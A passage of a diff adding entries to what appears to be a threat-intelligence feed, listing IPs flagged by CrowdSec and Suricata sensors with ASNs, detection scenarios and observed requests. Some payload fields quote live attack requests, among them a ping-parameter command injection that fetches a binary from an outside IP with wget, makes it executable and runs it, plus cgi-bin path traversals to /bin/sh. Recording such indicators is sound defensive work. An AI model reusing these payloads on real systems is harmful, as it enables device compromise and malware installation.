+        "comment": "Sources: crowdsec | first_seen: 2026-04-25T10:53:50Z | last_seen: 2026-04-25T10:53:50Z | hits: 1 | AS398722 CENSYS-ARIN-03 - Censys (199.45.154.0/24) | scenarios: crowdsec/http-bad-user-agent | payloads: GET / ; GET /debug/pprof/",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "199.45.154.143",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "8",
+            "name": "mwl:scanner=\"censys\"",
+            "colour": "#add377",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "ab75706a-aade-47a0-bc3d-94eab3b69eca",
+        "distribution": "5",
+        "timestamp": "1777208417",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-25T10:38:51Z | last_seen: 2026-04-25T10:38:51Z | hits: 1 | AS398324 CENSYS-ARIN-01 - Censys (66.132.195.0/24) | scenarios: crowdsec/http-bad-user-agent | payloads: GET / ; GET /debug/pprof/",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "66.132.195.51",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "c9f78174-da95-4b7d-bd08-7c162b4139da",
+        "distribution": "5",
+        "timestamp": "1777208417",
+        "comment": "Sources: crowdsec, suricata | first_seen: 2026-04-25T05:35:03Z | last_seen: 2026-04-25T05:35:04Z | hits: 2 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (74.248.0.0/15) | scenarios: crowdsec/http-cve-probing, suricata/ET SCAN Zmap User-Agent (Inbound) | payloads: GET /developmentserver/metadatauploader",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "74.249.128.154",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "140206a0-841a-4de6-8c95-371dded8e18a",
+        "distribution": "5",
+        "timestamp": "1777208417",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-25T03:38:34Z | last_seen: 2026-04-25T03:38:39Z | hits: 3 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (130.131.0.0/16) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-sensitive-files | payloads: GET /phpinfo.php ; GET /info.php ; GET /.env.production",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "130.131.86.141",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "50084c52-00ee-4040-8c45-7ac5963ecf7b",
+        "distribution": "5",
+        "timestamp": "1777208418",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T09:19:18Z | last_seen: 2026-04-25T09:19:18Z | hits: 1 | AS49870 AS49870-BV - Alsycon B.V. (89.190.156.0/24) | scenarios: suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 11",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "89.190.156.34",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "d08ad13e-ebe3-4bf2-bdf9-9c3487d2eebd",
+        "distribution": "5",
+        "timestamp": "1777208418",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T09:48:58Z | last_seen: 2026-04-25T09:48:58Z | hits: 1 | AS212238 CDNEXT - Datacamp Limited (89.222.96.0/23) | scenarios: suricata/ET EXPLOIT Possible Apache log4j RCE Attempt - 2021/12/12 Obfuscation Observed M2 (udp) (Outbound) (CVE-2021-44228)",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "89.222.97.30",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "1dc38f45-53c5-44c0-8d3c-640c6184dfdc",
+        "distribution": "5",
+        "timestamp": "1777208418",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T21:08:47Z | last_seen: 2026-04-25T21:08:47Z | hits: 1 | AS39486 HOSTROYALE - HostRoyale Technologies Pvt Ltd (103.109.244.0/24) | scenarios: suricata/SURICATA SSH invalid banner",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "103.109.244.117",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "d9b4b11b-fc9d-4d9c-8c14-aece7253a968",
+        "distribution": "5",
+        "timestamp": "1777208419",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T20:23:24Z | last_seen: 2026-04-25T20:23:24Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.286.0_4b9002f4e82840e23e7fff1649e3c2a1ec4f5569.exe?cacheHostOrigin=9.au.download.windowsupdate.com",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "172.189.127.25",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "ff54cd4d-b3b8-4479-bf1d-f6aac798d327",
+        "distribution": "5",
+        "timestamp": "1777208419",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T17:21:20Z | last_seen: 2026-04-25T17:21:20Z | hits: 1 | AS267611 TECHNO BYTES TELECOM (45.70.252.0/23) | scenarios: suricata/SURICATA SSH invalid banner",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "45.70.252.86",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "fb3ab886-f9bd-4772-8de2-0f58cc75301b",
+        "distribution": "5",
+        "timestamp": "1777208419",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T14:44:52Z | last_seen: 2026-04-25T14:44:52Z | hits: 1 | AS9009 M247 - M247 Europe SRL (37.120.213.0/24) | scenarios: suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt | payloads: POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh ; POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "37.120.213.13",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "33040866-d90d-495f-9e8d-b1300b6d8276",
+        "distribution": "5",
+        "timestamp": "1777208420",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T13:25:36Z | last_seen: 2026-04-25T13:25:36Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.275.0_6c3e98af1d921f55a8e9875226b720408cd86040.exe?cacheHostOrigin=au.download.windowsupdate.com",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "172.189.127.28",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "0d6ec4b3-311d-4d35-bdbc-139727e9d7f4",
+        "distribution": "5",
+        "timestamp": "1777208420",
+        "comment": "Sources: suricata | first_seen: 2026-04-25T22:11:16Z | last_seen: 2026-04-25T22:11:16Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.291.0_77386798d0c33d329d5f2f3599fe85e480098fb2.exe?cacheHostOrigin=3.au.download.windowsupdate.com",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "172.189.127.6",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "d12ad407-698c-4c40-b0b8-d21b001b8346",
+        "distribution": "5",
+        "timestamp": "1777251615",
+        "comment": "Sources: crowdsec, suricata | first_seen: 2026-04-26T10:29:45Z | last_seen: 2026-04-26T10:29:45Z | hits: 2 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (135.119.0.0/16) | scenarios: crowdsec/http-cve-probing, suricata/ET SCAN Zmap User-Agent (Inbound) | payloads: GET /developmentserver/metadatauploader",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "135.119.96.220",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "787aeea8-6980-48a3-93ba-8917ca69dcad",
+        "distribution": "5",
+        "timestamp": "1777288811",
+        "comment": "Sources: suricata | first_seen: 2026-04-26T10:23:00Z | last_seen: 2026-04-26T10:23:00Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.291.0_00c03b156d76ef578d8a3d7708536f1113f6f2f8.exe?cacheHostOrigin=4.au.download.windowsupdate.com",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "172.189.127.23",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "0adc3a31-ba62-47c9-bd7f-5c1abff0ca7b",
+        "distribution": "5",
+        "timestamp": "1777288811",
+        "comment": "Sources: suricata | first_seen: 2026-04-26T08:51:52Z | last_seen: 2026-04-26T08:51:52Z | hits: 1 | AS396982 GOOGLE-CLOUD-PLATFORM - Google LLC (34.75.96.0/20) | scenarios: suricata/ET SCAN WordPress Scanner Performing Multiple Requests to Windows Live Writer XML | payloads: GET /wordpress/wp-includes/wlwmanifest.xml",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "34.75.107.247",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "11",
+            "name": "mwl:cloud=\"gcp\"",
+            "colour": "#fb8535",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "7d008432-b2ab-48da-9757-3dcc3e9f42cc",
+        "distribution": "5",
+        "timestamp": "1777251615",
+        "comment": "Sources: suricata | first_seen: 2026-04-26T07:13:27Z | last_seen: 2026-04-26T07:13:27Z | hits: 1 | AS701 UUNET - Verizon Business (108.54.0.0/16) | scenarios: suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound) | payloads: GET /ping.cgi?pingIpAddress=google.fr;wget%20http://37.48.254.120/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7%27/&sessionKey=1039",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "108.54.90.54",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "e75c61f2-d6fb-4f91-8fac-95dbe3cb5879",
+        "distribution": "5",
+        "timestamp": "1777251616",
+        "comment": "Sources: suricata | first_seen: 2026-04-26T01:47:33Z | last_seen: 2026-04-26T01:47:33Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (40.124.0.0/16) | scenarios: suricata/SURICATA HTTP unable to match response to request",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "40.124.175.164",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "1d16c278-513d-40c5-9a6b-6f3321c97895",
+        "distribution": "5",
+        "timestamp": "1777290917",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-26T23:02:52Z | last_seen: 2026-04-26T23:02:52Z | hits: 3 | AS398705 CENSYS-ARIN-02 - Censys (167.94.146.0/24) | scenarios: crowdsec/http-bad-user-agent | payloads: GET / ; GET /debug/pprof/",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "167.94.146.59",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "8",
+            "name": "mwl:scanner=\"censys\"",
+            "colour": "#add377",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "a5fcce9c-7a9a-46f7-af5e-9c9793111bc3",
+        "distribution": "5",
+        "timestamp": "1777251618",
+        "comment": "Sources: suricata | first_seen: 2026-04-26T21:57:11Z | last_seen: 2026-04-26T21:57:11Z | hits: 1 | AS3215 AS3215 - Orange S.A. (80.13.0.0/16) | scenarios: suricata/SURICATA HTTP Request unrecognized authorization method | payloads: GET /",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "80.13.153.140",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "b896b424-51ea-484b-a00a-6233263d5737",
+        "distribution": "5",
+        "timestamp": "1777288812",
+        "comment": "Sources: suricata | first_seen: 2026-04-26T19:53:40Z | last_seen: 2026-04-26T19:53:40Z | hits: 1 | AS37457 Telkom-Internet (105.186.92.0/24) | scenarios: suricata/ET WEB_SERVER WGET Command Specifying Output in HTTP Headers | payloads: POST /HNAP1/",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "105.186.92.250",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "ba3b86ea-9518-45b1-8bba-69688687165e",
+        "distribution": "5",
+        "timestamp": "1777288813",
+        "comment": "Sources: suricata | first_seen: 2026-04-26T15:18:43Z | last_seen: 2026-04-26T15:18:43Z | hits: 1 | AS14061 DIGITALOCEAN-ASN - DigitalOcean (165.227.32.0/20) | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound) | payloads: GET /",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "165.227.47.218",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "8be270e9-7627-4488-bb3b-c6c8ead5bb8a",
+        "distribution": "5",
+        "timestamp": "1777294824",
+        "comment": "Sources: suricata | first_seen: 2026-04-27T00:43:19Z | last_seen: 2026-04-27T00:43:19Z | hits: 4 | AS215925 VPSVAULTHOST - VPSVAULT.HOST LTD (45.205.1.0/24) | scenarios: suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 10",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "45.205.1.8",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "8daa6a16-ee65-4de7-a622-4304f3c10a50",
+        "distribution": "5",
+        "timestamp": "1777294822",
+        "comment": "Sources: suricata | first_seen: 2026-04-27T09:24:39Z | last_seen: 2026-04-27T09:24:39Z | hits: 4 | AS45090 TENCENT-NET-AP Shenzhen Tencent Computer Systems Company Limited (124.221.64.0/18) | scenarios: suricata/ET EXPLOIT HackingTrio UA (Hello, World) | payloads: POST /GponForm/diag_Form?images/",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "124.221.64.62",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "7adf2235-52bd-4e19-8955-0a75811a99af",
+        "distribution": "5",
+        "timestamp": "1777294823",
+        "comment": "Sources: suricata | first_seen: 2026-04-27T07:26:50Z | last_seen: 2026-04-27T07:26:50Z | hits: 4 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.304.0_763cea0bbf7b3b7093c7a563406d52a22490f3f4.exe?cacheHostOrigin=3.au.download.windowsupdate.com",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "172.189.127.13",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
+      },
+      {
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "uuid": "92b8e502-95cd-4d6c-a541-631ef22cfe16",
+        "distribution": "5",
+        "timestamp": "1777294823",
+        "comment": "Sources: suricata | first_seen: 2026-04-27T03:17:04Z | last_seen: 2026-04-27T03:17:04Z | hits: 4 | AS396982 GOOGLE-CLOUD-PLATFORM - Google LLC (136.112.0.0/16) | scenarios: suricata/SURICATA HTTP unable to match response to request",
+        "deleted": false,
+        "disable_correlation": false,
+        "object_relation": null,
+        "first_seen": null,
+        "last_seen": null,
+        "value": "136.112.32.76",
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
